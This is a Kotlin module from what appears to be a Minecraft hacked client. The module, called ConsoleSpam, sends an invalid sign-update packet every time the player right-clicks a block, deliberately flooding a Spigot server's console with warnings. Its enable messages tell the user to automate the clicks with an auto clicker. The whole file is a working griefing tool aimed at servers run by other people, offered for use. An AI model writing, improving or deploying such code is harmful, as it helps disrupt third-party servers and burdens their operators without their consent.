package com.defrag.client.module.modules.misc

import com.defrag.client.event.events.PacketEvent
import com.defrag.client.module.Category
import com.defrag.client.module.Module
import com.defrag.client.util.text.MessageSendHelper
import com.defrag.client.util.threads.safeListener
import net.minecraft.network.play.client.CPacketPlayerTryUseItemOnBlock
import net.minecraft.network.play.client.CPacketUpdateSign
import net.minecraft.tileentity.TileEntitySign

object ConsoleSpam : Module(
    name = "ConsoleSpam",
    description = "Spams Spigot consoles by sending invalid UpdateSign packets",
    category = Category.MISC
) {
    init {
        onEnable {
            MessageSendHelper.sendChatMessage("$chatName Every time you right click a sign, a warning will appear in console.")
            MessageSendHelper.sendChatMessage("$chatName Use an auto clicker to automate this process.")
        }

        safeListener<PacketEvent.Send> {
            if (it.packet !is CPacketPlayerTryUseItemOnBlock) return@safeListener
            connection.sendPacket(CPacketUpdateSign(it.packet.pos, TileEntitySign().signText))
        }
    }
}